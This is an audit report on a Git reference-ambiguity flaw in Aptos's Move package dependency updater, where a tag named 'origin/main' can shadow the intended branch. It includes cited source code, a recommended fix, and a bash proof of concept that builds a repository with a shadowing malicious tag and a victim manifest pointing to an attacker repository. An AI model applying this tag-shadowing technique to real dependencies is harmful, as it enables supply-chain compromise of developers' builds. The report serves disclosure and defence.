# Audit Report

## Title
Git Reference Ambiguity Enables Supply Chain Attacks via Malicious Tag Injection

## Summary
A Git reference resolution vulnerability in the Move package dependency system allows attackers to inject malicious code by creating tags with names that shadow remote branch references (e.g., `origin/main`). When developers update dependencies, Git preferentially resolves to the malicious tag instead of the intended branch, enabling supply chain attacks against Aptos smart contracts and infrastructure.

## Finding Description

The vulnerability exists in the Git dependency update mechanism used by Aptos to fetch Move package dependencies. The core issue is in how Git resolves ambiguous reference names when both a tag and a remote branch could match.

**Vulnerable Code Path:** [1](#0-0) 

The `reset_hard` function constructs a Git reference as `origin/{rev}` where `rev` is the branch name specified in `Move.toml`: [2](#0-1) 

This reference is used during dependency updates: [3](#0-2) 

**Git Reference Resolution Order:**

When Git resolves a reference like `origin/main`, it searches in this order:
1. `refs/tags/origin/main` (tags)
2. `refs/remotes/origin/main` (remote tracking branches)

Since tags have higher precedence, an attacker can exploit this by:

1. Creating a legitimate repository with a branch named `main` containing benign code
2. Creating a malicious tag named `origin/main` pointing to malicious code
3. When victims specify `rev = "main"` in their Move.toml dependencies and update their packages, the code executes `git reset --hard origin/main`
4. Git resolves to `refs/tags/origin/main` (the malicious tag) instead of `refs/remotes/origin/main` (the intended branch)

**Attack Flow:**

1. Victim's `Move.toml` specifies: `git = "https://attacker.com/malicious-package.git", rev = "main"`
2. Initial clone works correctly (checks out the `main` branch)
3. Later, when `skip_fetch_latest_git_deps = false` (default behavior):
   - Code fetches updates from origin, including all tags
   - Code executes `git reset --hard origin/main`
   - Git resolves to the malicious tag `refs/tags/origin/main`
4. Developer unknowingly compiles and deploys malicious Move bytecode

This affects all Aptos package builds that use Git dependencies: [4](#0-3) [5](#0-4) 

## Impact Explanation

**Severity: Medium** (per Aptos Bug Bounty criteria)

This vulnerability enables sophisticated supply chain attacks against the Aptos ecosystem:

1. **Compromised Smart Contracts**: Malicious Move modules could be injected into legitimate packages, leading to:
   - Backdoors in DeFi protocols
   - Fund theft through manipulated contract logic
   - Unauthorized access to privileged operations

2. **Non-Deterministic Builds**: Different developers building the same package specification could receive different code, breaking the **Deterministic Execution** invariant. This could cause:
   - Consensus splits if validators build with different dependency versions
   - State inconsistencies requiring manual intervention

3. **Framework Compromise**: If this affects Aptos Framework dependencies or core infrastructure packages, it could impact the entire network's security posture.

While this doesn't directly cause immediate consensus failures or network-wide fund loss, it creates a persistent attack vector for:
- Limited funds loss or manipulation (Medium severity criterion)
- State inconsistencies requiring intervention (Medium severity criterion)
- Potential escalation to Critical severity if framework packages are compromised

## Likelihood Explanation

**Likelihood: Medium to High**

**Attacker Requirements:**
- Control over a Git repository (trivial - free on GitHub, GitLab, etc.)
- Ability to create tags with "/" characters (standard Git feature)
- Target must use the attacker's repository as a dependency

**Feasibility:**
- **High**: The attack is technically simple - just `git tag origin/main <malicious-commit-hash>`
- **High**: Many Aptos developers use third-party Git dependencies for utility libraries, testing frameworks, or shared modules
- **Medium**: Requires social engineering to make developers depend on the malicious repository, BUT this is common in supply chain attacks (e.g., typosquatting, compromised maintainer accounts, or legitimate-looking utility packages)

**Detection Difficulty:**
- The attack is stealthy - developers see "main" in their Move.toml but unknowingly get a different commit
- No warning is issued when Git resolves to a tag instead of a branch
- Standard code review might miss this as the dependency specification appears legitimate

This is a realistic threat vector that has been exploited in other ecosystems (npm, PyPI supply chain attacks).

## Recommendation

**Immediate Fix**: Use fully-qualified reference names to eliminate ambiguity.

Replace the ambiguous reference format in `git.rs`:

```rust
// VULNERABLE CODE (line 104):
&format!("origin/{}", rev)

// SECURE FIX:
&format!("refs/remotes/origin/{}", rev)
```

This explicitly specifies the remote-tracking branch namespace, preventing Git from matching tags.

**Complete Fix** - Modify `reset_hard` function:

```rust
pub(crate) fn reset_hard(repo_path: &str, rev: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-C",
            repo_path,
            "reset",
            "--hard",
            // Use fully-qualified ref to prevent tag shadowing
            &format!("refs/remotes/origin/{}", rev)
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!(
                "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps",
                rev,
                dep_name
            )
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps | Exit status: {}",
            rev,
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**Additional Hardening:**
1. Validate that resolved commits match expected remote branches, not tags
2. Add warnings when tags with "/" characters are detected in dependency repositories
3. Consider migrating fully to the newer libgit2-based system in `move-package-cache` which explicitly handles refs through the API

## Proof of Concept

**Step 1: Create Malicious Repository**

```bash
# Create attacker's repository
mkdir malicious-package && cd malicious-package
git init

# Create benign code on main branch
cat > Move.toml << 'EOF'
[package]
name = "Utility"
version = "1.0.0"

[dependencies]
EOF

mkdir sources
cat > sources/benign.move << 'EOF'
module Utility::Safe {
    public fun safe_function(): u64 { 100 }
}
EOF

git add . && git commit -m "Benign code"
git branch -M main

# Create malicious code on separate commit
cat > sources/benign.move << 'EOF'
module Utility::Safe {
    // Malicious: always returns 0, could cause calculation errors
    public fun safe_function(): u64 { 0 }
}
EOF

git add . && git commit -m "Malicious code"
MALICIOUS_COMMIT=$(git rev-parse HEAD)

# Reset back to benign code
git reset --hard HEAD~1

# Create shadow tag that will be resolved instead of branch
git tag origin/main $MALICIOUS_COMMIT

# Push to remote
git remote add origin https://github.com/attacker/malicious-package.git
git push origin main
git push origin origin/main  # Push the malicious tag
```

**Step 2: Victim's Package Configuration**

```toml
# Victim's Move.toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
Utility = { git = "https://github.com/attacker/malicious-package.git", rev = "main" }
```

**Step 3: Trigger Vulnerability**

```bash
# Initial build works (gets benign code)
aptos move compile

# Update dependencies (triggers vulnerability)
aptos move compile --force

# Result: Victim now has MALICIOUS code compiled into their package
# because git reset --hard origin/main resolved to the tag, not the branch
```

**Verification:**

```bash
# In the dependency cache directory, verify which commit was checked out:
cd ~/.move/dependencies/Utility
git log -1 --oneline  # Shows malicious commit hash, not main branch tip
```

This demonstrates that a developer following normal Aptos development practices would unknowingly compile and potentially deploy malicious code.

## Notes

- This vulnerability affects the legacy Move package resolution system still used by Aptos core builds
- The newer `move-package-cache` system using libgit2 is less vulnerable as it uses explicit OID resolution, but Aptos currently uses the command-line git path
- Tags are automatically fetched during `git clone` and `git fetch origin` operations, making this attack practical
- The vulnerability is a Time-of-Check-Time-of-Use (TOCTOU) issue: initial checkout verifies branch, but update uses ambiguous reference

### Citations

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L97-125)
```rust
pub(crate) fn reset_hard(repo_path: &str, rev: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-C",
            repo_path,
            "reset",
            "--hard",
            &format!("origin/{}", rev)
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!(
                "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps",
                rev,
                dep_name
            )
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps | Exit status: {}",
            rev,
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L132-140)
```rust
    Git {
        /// URL to the Git repository.
        url: Url,
        /// Optional Git revision to pin the dependency to.
        /// This can be a commit hash, a branch name or a tag name.
        rev: Option<String>,
        /// Optional subdirectory within the Git repository.
        subdir: Option<String>,
    },
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L605-610)
```rust
                // If the current folder exists, do a fetch and reset to ensure that the branch
                // is up to date
                // NOTE: this means that you must run the package system with a working network connection
                git::fetch_origin(git_path, dep_name)?;
                git::reset_hard(git_path, git_rev, dep_name)?;
            }
```

**File:** aptos-move/framework/src/built_package.rs (L275-281)
```rust
    pub fn prepare_resolution_graph(
        package_path: PathBuf,
        build_config: BuildConfig,
    ) -> anyhow::Result<ResolvedGraph> {
        eprintln!("Compiling, may take a little while to download git dependencies...");
        build_config.resolution_graph_for_package(&package_path, &mut stderr())
    }
```

**File:** third_party/move/tools/move-package/src/lib.rs (L203-222)
```rust
    pub fn resolution_graph_for_package<W: Write>(
        mut self,
        path: &Path,
        writer: &mut W,
    ) -> Result<ResolvedGraph> {
        if self.test_mode {
            self.dev_mode = true;
        }
        let path = SourcePackageLayout::try_find_root(path)?;
        let toml_manifest =
            self.parse_toml_manifest(path.join(SourcePackageLayout::Manifest.path()))?;
        let mutx = PackageLock::lock();
        // This should be locked as it inspects the environment for `MOVE_HOME` which could
        // possibly be set by a different process in parallel.
        let manifest = manifest_parser::parse_source_manifest(toml_manifest)?;
        let resolution_graph = ResolutionGraph::new(manifest, path, self, writer)?;
        let ret = resolution_graph.resolve();
        mutx.unlock();
        ret
    }
```
